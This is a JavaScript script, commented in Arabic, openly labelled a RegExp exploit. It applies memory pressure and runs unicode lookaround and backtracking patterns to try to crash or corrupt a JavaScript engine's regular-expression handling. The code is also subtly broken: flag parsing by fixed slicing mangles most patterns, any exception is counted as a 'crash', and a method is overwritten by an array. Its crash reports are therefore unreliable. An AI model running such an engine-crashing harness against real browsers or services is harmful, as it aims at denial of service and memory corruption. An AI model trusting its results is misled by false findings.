import { log, sleep } from './module/utils.mjs';

class ReliableRegExpExploit {
    constructor() {
        this.crashCount = 0;
        this.attemptCount = 0;
    }

    async execute() {
        // زيادة الضغط على الذاكرة أولاً
        await this.memoryPressure();
        
        // ثم تجربة الأنماط المختلفة
        return await this.massPatternTesting();
    }

    async memoryPressure() {
        log("Applying memory pressure...");
        
        // استنزاف الذاكرة لزيادة فرص الـ crash
        const pressure = [];
        for (let i = 0; i < 1000; i++) {
            pressure.push(new ArrayBuffer(0x10000)); // 64KB each
            pressure.push(String.fromCodePoint(0x1F600).repeat(1000));
            
            if (i % 100 === 0) {
                await sleep(1);
            }
        }
        
        this.memoryPressure = pressure;
        log("Memory pressure applied");
    }

    async massPatternTesting() {
        const patterns = this.generatePatterns();
        let successfulPatterns = [];
        
        for (let round = 0; round < 10; round++) {
            log(`Crash round ${round + 1}/10`);
            
            for (const pattern of patterns) {
                this.attemptCount++;
                
                if (await this.testPatternWithPressure(pattern)) {
                    successfulPatterns.push(pattern);
                    this.crashCount++;
                    log(`CRASH #${this.crashCount} with: ${pattern}`);
                    
                    if (this.crashCount >= 3) {
                        log("Multiple crashes confirmed - pattern is reliable");
                        return successfulPatterns;
                    }
                }
                
                if (this.attemptCount % 50 === 0) {
                    await sleep(10);
                }
            }
            
            // إعادة ضغط الذاكرة بين الجولات
            await this.reapplyMemoryPressure();
        }
        
        return successfulPatterns;
    }

    generatePatterns() {
        // أنماط أكثر تنوعاً وتعقيداً
        const bases = [
            "(?!(?=^a|()+()+x)(abc))",
            "(?!(?=^a|x)(abc))",
            "(?=^).",
            "(?=$).",
            "^(?:)",
            "$(?:)",
            "(?<=^).",
            "(?<=$).",
            "\\b",
            "\\B",
            "(?=.*)",
            "(?!)",
            "(?=)",
            "(?!)"
        ];
        
        const flags = ["gmu", "gm", "gu", "mu", "g", "m", "u"];
        
        const patterns = [];
        for (const base of bases) {
            for (const flag of flags) {
                patterns.push(`/${base}/${flag}`);
            }
        }
        
        return patterns;
    }

    async testPatternWithPressure(patternStr) {
        try {
            const regex = new RegExp(patternStr.slice(1, -4), patternStr.slice(-3));
            
            // strings بأحجام وأنواع مختلفة
            const testStrings = [
                String.fromCodePoint(0x1F600).repeat(100), // 😀
                String.fromCodePoint(0x1F601).repeat(50),  // 😁
                String.fromCodePoint(0x1F602).repeat(150), // 😂
                "A".repeat(200) + String.fromCodePoint(0x1F600) + "B".repeat(200),
                String.fromCodePoint(0x10000).repeat(30),  // Non-BMP
                String.fromCodePoint(0x10FFFF).repeat(25), // Max Unicode
                "\uD83D\uDE00".repeat(80), // Surrogate pair
            ];
            
            for (const testStr of testStrings) {
                testStr.replace(regex, '|');
            }
            
            return false; // No crash
            
        } catch (e) {
            return true; // Crash occurred
        }
    }

    async reapplyMemoryPressure() {
        // إضافة المزيد من الضغط على الذاكرة
        for (let i = 0; i < 200; i++) {
            this.memoryPressure.push(new ArrayBuffer(0x8000));
            this.memoryPressure.push("X".repeat(5000));
        }
    }

    // إذا لم يحدث crash، نجرب أسلوباً مختلفاً
    async alternativeApproach() {
        log("Trying alternative approach - heap corruption via RegExp");
        
        const complexPatterns = [
            "/(?=(.?)+(?!(.?)))/gmu",
            "/(.*)*/gmu", 
            "/(.+)*/gmu",
            "/(a*)*/gmu",
            "/(a|b?)*/gmu"
        ];
        
        for (const pattern of complexPatterns) {
            log(`Testing complex pattern: ${pattern}`);
            
            try {
                const regex = new RegExp(pattern.slice(1, -4), pattern.slice(-3));
                const str = String.fromCodePoint(0x1F600).repeat(1000);
                
                // تنفيذ متكرر
                for (let i = 0; i < 100; i++) {
                    str.replace(regex, 'X');
                }
                
            } catch (e) {
                log(`COMPLEX PATTERN CRASH: ${pattern} - ${e}`);
                return true;
            }
            
            await sleep(5);
        }
        
        return false;
    }
}

// التشغيل مع استراتيجيات متعددة
async function comprehensiveTest() {
    const exploit = new ReliableRegExpExploit();
    
    log("Starting comprehensive RegExp exploit test...");
    
    // الاستراتيجية الأولى
    const crashes = await exploit.execute();
    
    if (crashes.length > 0) {
        log(`Success! Found ${crashes.length} crashing patterns`);
        for (const crash of crashes) {
            log(`  - ${crash}`);
        }
    } else {
        log("No crashes with standard patterns, trying alternatives...");
        
        // الاستراتيجية البديلة
        const altSuccess = await exploit.alternativeApproach();
        if (altSuccess) {
            log("Alternative approach succeeded!");
        } else {
            log("No crashes detected - environment may be patched or needs different parameters");
        }
    }
    
    log(`Total attempts: ${exploit.attemptCount}`);
}

// التشغيل
comprehensiveTest();